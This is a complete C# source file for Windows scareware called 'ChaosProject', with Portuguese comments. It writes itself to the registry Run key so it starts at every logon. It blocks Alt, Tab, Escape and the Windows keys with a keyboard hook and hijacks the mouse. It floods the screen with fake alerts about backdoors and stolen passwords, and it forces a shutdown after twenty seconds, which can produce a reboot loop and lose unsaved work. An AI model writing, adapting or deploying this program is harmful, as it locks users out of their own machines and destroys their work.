using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using Microsoft.Win32;
using System.Diagnostics;

namespace ChaosProject
{
    static class Program
    {
        // --- APIS WINDOWS ---
        [DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
        public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern short GetKeyState(int nVirtKey);

        const uint SPI_SETMOUSETRAILS = 0x005D;
        const uint SPI_SETMOUSESPEED = 0x0071;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        static string[] mensagens = {
            "INJETANDO EXPLOIT...", "CRYPTING FILES...", "FORMATANDO UNIDADE C:...",
            "ACCESS GRANTED - ROOT", "COPIANDO SENHAS DO BROWSER...",
            "ENVIANDO DADOS PARA O SERVIDOR...", "BYPASSING WINDOWS DEFENDER...",
            "INSTALANDO BACKDOOR...", "SYSTEM FAILURE - REBOOT REQUIRED"
        };

        static Random rand = new Random();
        static Form backgroundForm;

        [STAThread]
        static void Main()
        {
            _hookID = SetHook(_proc);

            // --- CONFIG DO MOUSEE ---
            SystemParametersInfo(SPI_SETMOUSETRAILS, 10, 0, 0);
            SystemParametersInfo(SPI_SETMOUSESPEED, 0, 20, 0);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // PERSISTÊNCIA SRSR
            try { Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true).SetValue("Projeto001", Application.ExecutablePath); } catch { }

            // --- NOVO TEMPORIZADOR: DESLIGAMENTO FORÇADO EM 20 SEGUNDOS EM MILESSIMOS DE SEGUNDOS---
            Task.Run(async () => {
                await Task.Delay(20000); // Espera 20 segundos
                ProcessStartInfo psi = new ProcessStartInfo("shutdown", "/s /f /t 0")
                {
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(psi);
            });

            // JANELA DE FUNDO
            backgroundForm = new Form
            {
                Text = "",
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                BackColor = Color.Black,
                TopMost = true,
                ShowInTaskbar = false
            };

            Label bgLabel = new Label
            {
                Text = ">>> SYSTEM_FAILURE: INÍCIO DE VARREDURA CRÍTICA <<<",
                Font = new Font("Consolas", 24, FontStyle.Bold),
                ForeColor = Color.DarkRed,
                Location = new Point(50, 50),
                AutoSize = true
            };
            backgroundForm.Controls.Add(bgLabel);

            Task.Run(async () => {
                while (true)
                {
                    if (backgroundForm.IsHandleCreated)
                    {
                        backgroundForm.Invoke(new Action(() => {
                            backgroundForm.BackColor = (backgroundForm.BackColor == Color.Black) ? Color.FromArgb(20, 0, 0) : Color.Black;
                            bgLabel.ForeColor = (bgLabel.ForeColor == Color.DarkRed) ? Color.Red : Color.DarkRed;
                        }));
                    }
                    await Task.Delay(500);
                }
            });

            Task.Run(() => Application.Run(backgroundForm));

            // LOOP DO MOUSE
            Task.Run(() => {
                while (true)
                {
                    int x = rand.Next(Screen.PrimaryScreen.Bounds.Width);
                    int y = rand.Next(Screen.PrimaryScreen.Bounds.Height);
                    SetCursorPos(x, y);
                    Thread.Sleep(15);
                }
            });

            // BACKDOOR (CTRL+SHIFT+F12)
            Task.Run(() => {
                while (true)
                {
                    if (Control.ModifierKeys == (Keys.Control | Keys.Shift) && (ushort)GetKeyState(0x7B) > 255)
                    {
                        SystemParametersInfo(SPI_SETMOUSETRAILS, 0, 0, 0);
                        SystemParametersInfo(SPI_SETMOUSESPEED, 0, 10, 0);
                        UnhookWindowsHookEx(_hookID);
                        Environment.Exit(0);
                    }
                    Thread.Sleep(50);
                }
            });

            // GHOST TYPING
            Task.Run(async () => {
                while (true)
                {
                    await Task.Delay(rand.Next(8000, 20000));
                    SendKeys.SendWait("SISTEMA COMPROMETIDO... ");
                }
            });

            Task.Delay(2000).ContinueWith(_ => {
                for (int i = 0; i < 5; i++) SpawnThread();
            }, TaskScheduler.FromCurrentSynchronizationContext());

            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
                return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;
                if (key == Keys.Tab || key == Keys.LWin || key == Keys.RWin || key == Keys.Alt || key == Keys.Escape) return (IntPtr)1;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        static void SpawnThread()
        {
            Thread t = new Thread(CriarJanelaNotificacao);
            t.SetApartmentState(ApartmentState.STA);
            t.IsBackground = false;
            t.Start();
        }

        static void CriarJanelaNotificacao()
        {
            Form n = new Form
            {
                Text = "SYSTEM_ERROR",
                Size = new Size(350, 140),
                BackColor = Color.Black,
                TopMost = true,
                FormBorderStyle = FormBorderStyle.None,
                ShowInTaskbar = false,
                StartPosition = FormStartPosition.Manual
            };

            Point posOriginal = new Point(rand.Next(Screen.PrimaryScreen.Bounds.Width - 350), rand.Next(Screen.PrimaryScreen.Bounds.Height - 140));
            n.Location = posOriginal;

            Label lbl = new Label
            {
                Text = mensagens[rand.Next(mensagens.Length)],
                Location = new Point(20, 30),
                ForeColor = Color.Lime,
                Font = new Font("Consolas", 10, FontStyle.Bold),
                AutoSize = true
            };

            Panel bgBar = new Panel { Location = new Point(20, 70), Size = new Size(300, 15), BackColor = Color.FromArgb(20, 20, 20) };
            Panel progressBar = new Panel { Location = new Point(0, 0), Size = new Size(0, 15), BackColor = Color.Red };

            bgBar.Controls.Add(progressBar);
            n.Controls.Add(lbl);
            n.Controls.Add(bgBar);

            n.MouseMove += (s, e) => {
                posOriginal = new Point(rand.Next(Screen.PrimaryScreen.Bounds.Width - 350), rand.Next(Screen.PrimaryScreen.Bounds.Height - 140));
                n.Location = posOriginal;
                SystemSounds.Hand.Play();
            };

            n.Shown += async (s, e) => {
                int progresso = 0;
                while (progresso < 300)
                {
                    progresso += rand.Next(3, 12);
                    if (n.IsHandleCreated)
                    {
                        n.Invoke(new Action(() => {
                            progressBar.Width = Math.Min(progresso, 300);
                            n.Location = new Point(posOriginal.X + rand.Next(-3, 4), posOriginal.Y + rand.Next(-3, 4));
                            n.BackColor = (n.BackColor == Color.Black) ? Color.FromArgb(50, 0, 0) : Color.Black;
                        }));
                    }
                    await Task.Delay(100);
                }
                if (backgroundForm != null && backgroundForm.IsHandleCreated)
                {
                    backgroundForm.Invoke(new Action(() => backgroundForm.BackColor = Color.White));
                    await Task.Delay(50);
                }
                SystemSounds.Exclamation.Play();
                SpawnThread(); SpawnThread();
                n.Invoke(new Action(() => n.Dispose()));
            };
            Application.Run(n);
        }
    }

}
